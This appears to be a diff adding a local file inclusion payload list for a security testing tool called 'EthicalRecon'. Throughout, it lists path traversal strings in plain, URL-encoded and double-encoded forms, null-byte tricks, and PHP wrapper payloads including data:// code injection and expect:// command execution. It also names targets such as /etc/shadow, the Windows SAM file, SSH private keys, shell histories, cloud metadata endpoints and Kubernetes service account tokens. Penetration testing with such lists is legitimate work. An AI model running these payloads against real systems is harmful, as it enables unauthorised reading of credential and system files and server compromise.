@@ -1,0 +1,243 @@
+# Advanced Local File Inclusion Payloads for EthicalRecon
+# Comprehensive file inclusion testing patterns
+
+# Basic LFI
+../../../etc/passwd
+..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/group
+/etc/issue
+/etc/hostname
+/etc/ssh/sshd_config
+/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
+
+# Windows files
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+C:\Windows\win.ini
+C:\Windows\system.ini
+C:\boot.ini
+C:\Windows\System32\inetsrv\MetaBase.xml
+
+# Common web application files
+/var/www/html/index.php
+/var/www/html/config.php
+/var/www/html/wp-config.php
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+
+# Encoded traversal
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%77%69%6e%64%6f%77%73%5c%73%79%73%74%65%6d%33%32%5c%64%72%69%76%65%72%73%5c%65%74%63%5c%68%6f%73%74%73
+..%2f..%2f..%2fetc%2fpasswd
+..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
+
+# Double encoding
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564
+
+# Deep traversal
+../../../../../../../../etc/passwd
+..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+....//....//....//....//etc/passwd
+....\\\\....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts
+
+# Null byte injection (for older PHP versions)
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+../../../etc/passwd\0
+
+# PHP wrappers
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=../../../etc/passwd
+php://filter/string.rot13/resource=index.php
+php://filter/zlib.deflate/resource=index.php
+php://input
+php://stdin
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+data://text/plain,<?php phpinfo(); ?>
+
+# File protocol
+file:///etc/passwd
+file:///C:/Windows/System32/drivers/etc/hosts
+file://localhost/etc/passwd
+
+# Expect wrapper (if expect extension loaded)
+expect://id
+expect://whoami
+expect://ls
+
+# Zip wrapper
+zip://archive.zip#dir/file.txt
+zip:///path/to/archive.zip#file.txt
+
+# Phar wrapper
+phar://archive.phar/file.txt
+phar:///path/to/archive.phar/file.txt
+
+# SSH wrapper (if SSH2 extension loaded)
+ssh2.sftp://user:pass@host:22/path/to/file
+ssh2.scp://user:pass@host:22/path/to/file
+
+# FTP wrapper
+ftp://user:pass@host/path/to/file
+ftps://user:pass@host/path/to/file
+
+# Dictionary bypass
+....//....//....//etc/passwd
+..././..././..././etc/passwd
+...\\..\\..\\/etc/passwd
+
+# Case variation
+../../../ETC/PASSWD
+../../../etc/PASSWD
+../../../Etc/Passwd
+
+# Platform-specific paths
+# Linux
+/proc/version
+/proc/cmdline
+/proc/mounts
+/proc/net/arp
+/proc/net/route
+/proc/net/tcp
+/proc/net/udp
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/stat
+/proc/self/status
+
+# Mac OS
+/System/Library/LaunchDaemons/ssh.plist
+/etc/master.passwd
+/etc/resolv.conf
+/etc/sudoers
+
+# Common log files
+/var/log/messages
+/var/log/syslog
+/var/log/auth.log
+/var/log/daemon.log
+/var/log/debug
+/var/log/dmesg
+/var/log/dpkg.log
+/var/log/faillog
+/var/log/kern.log
+/var/log/lastlog
+/var/log/mail.log
+/var/log/user.log
+/var/log/wtmp
+/var/log/xferlog
+/var/log/secure
+/var/log/boot.log
+
+# Application-specific files
+# Apache
+/etc/apache2/sites-available/default
+/etc/apache2/sites-available/000-default
+/etc/apache2/sites-enabled/000-default
+/usr/local/apache2/conf/httpd.conf
+/etc/httpd/conf/httpd.conf
+
+# Nginx
+/etc/nginx/sites-available/default
+/etc/nginx/sites-enabled/default
+/usr/local/nginx/conf/nginx.conf
+
+# MySQL
+/etc/mysql/my.cnf
+/etc/my.cnf
+/etc/mysql/mysql.conf.d/mysqld.cnf
+
+# PostgreSQL
+/etc/postgresql/*/main/postgresql.conf
+/var/lib/pgsql/data/postgresql.conf
+
+# SSH
+/home/*/.ssh/id_rsa
+/home/*/.ssh/id_dsa
+/home/*/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/id_dsa
+/root/.ssh/authorized_keys
+
+# Application configs
+/etc/redis/redis.conf
+/etc/mongodb.conf
+/opt/lampp/etc/httpd.conf
+
+# Interesting files for enumeration
+/root/.bash_history
+/home/*/.bash_history
+/root/.mysql_history
+/home/*/.mysql_history
+/var/mail/root
+/var/spool/mail/root
+
+# PHP session files
+/var/lib/php/sessions/sess_*
+/tmp/sess_*
+
+# Backup files
+index.php.bak
+config.php.bak
+.htaccess.bak
+web.config.bak
+
+# Source code disclosure
+index.php~
+config.php~
+.config.php.swp
+.index.php.swp
+
+# Cloud metadata
+# AWS
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+
+# Google Cloud
+http://metadata.google.internal/computeMetadata/v1/
+
+# Azure
+http://169.254.169.254/metadata/instance
+
+# Container escape attempts
+/var/run/docker.sock
+/proc/self/cgroup
+/.dockerenv
+/var/run/secrets/kubernetes.io/serviceaccount/token
+
+# Java-specific
+/WEB-INF/web.xml
+/META-INF/MANIFEST.MF
+../../../WEB-INF/web.xml
+../../../META-INF/MANIFEST.MF
+
+# .NET specific
+/web.config
+../../../web.config
+/app.config
+../../../app.config
+
+# Node.js specific
+/package.json
+../../../package.json
+/node_modules/
+/.env
+
+# Python specific
+/requirements.txt
+../../../requirements.txt
+/settings.py
+../../../settings.py
+
+# Ruby specific
+/Gemfile
+../../../Gemfile
+/config/database.yml
+../../../config/database.yml
